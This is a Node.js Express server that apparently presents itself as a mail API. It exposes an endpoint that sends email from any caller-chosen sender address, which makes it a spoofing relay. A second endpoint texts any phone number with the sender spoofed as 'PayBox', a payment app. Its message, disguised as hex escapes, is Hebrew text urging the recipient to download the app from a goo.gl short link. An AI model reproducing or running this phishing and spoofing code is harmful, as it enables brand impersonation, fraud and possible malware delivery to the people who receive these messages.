const express = require('express');
const nodemailer = require('nodemailer');
const bodyparser = require('body-parser');
const fs = require('fs');
const app = express();
const cors = require('cors');
const http = require('http');
const https = require('https');
const request = require('request');
const config = require('./config.json');

if (config.certPath && config.privatekeyPath) {
    var privateKey = fs.readFileSync(config.privatekeyPath);
    var certificate = fs.readFileSync(config.certPath);
    var credentials = { key: privateKey, cert: certificate };
}

app.use(bodyparser.json());
app.use(bodyparser.urlencoded());
app.use(cors());

app.post('/mail', (req, res) => {
    nodemailer.mail({
        from: req.body.from, // sender address
        to: req.body.to, // list of receivers
        subject: req.body.subject, // Subject line
        html: req.body.html
    });
    res.json(`Mail sent!\nFrom: ${req.body.from}\nTo: ${req.body.to}`);
});

app.post('/sms', (req, res) => {
    let messageString = "\xD7\x9C\xD7\x94\xD7\xA6\xD7\x98\xD7\xA8\xD7\xA4\xD7\x95\xD7\xAA\x20\xD7\x95\xD7\x94\xD7\x95\xD7\xA8\xD7\x93\xD7\x94\x20\xD7\x97\xD7\x99\xD7\xA0\xD7\x9D\x20\xD7\xA9\xD7\x9C\x20\xD7\x90\xD7\xA4\xD7\x9C\xD7\x99\xD7\xA7\xD7\xA6\xD7\x99\xD7\x99\xD7\xAA\x20\xD7\xA4\xD7\x99\xD7\x99\xD7\x91\xD7\x95\xD7\xA7\xD7\xA1\x20\xD7\x99\xD7\xA9\x20\xD7\x9C\xD7\x94\xD7\x95\xD7\xA8\xD7\x99\xD7\x93\x20\xD7\x9E\xD7\x94\xD7\xA7\xD7\x99\xD7\xA9\xD7\x95\xD7\xA8\x20\xD7\x94\xD7\xA0\xD7\xB4\xD7\x9C\x3A\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6F\x6F\x2E\x67\x6C\x2F\x37\x6E\x52\x57\x59\x31\x0A";
    let url = `https://api.inforu.co.il/inforufrontend/WebInterface/SendMessageByNumber.aspx?UserName=${config.smsUser}&Password=${config.smsPassword}&SenderCellNumber=PayBox&CellNumber=${req.query.number}&MessageString=${messageString}`;
    request.get(url, (err, rsp, body) => {
        if (body == "1") res.status(200);
        else res.status(500);
        res.json(res.statusCode);
    });
});

// app.listen(3000, "0.0.0.0", () => console.log('Mail API listening on port 3000!'));
http.createServer(app).listen(3000);
if (credentials != null)
    https.createServer({
        key: privateKey,
        cert: certificate
    }, app).listen(8443);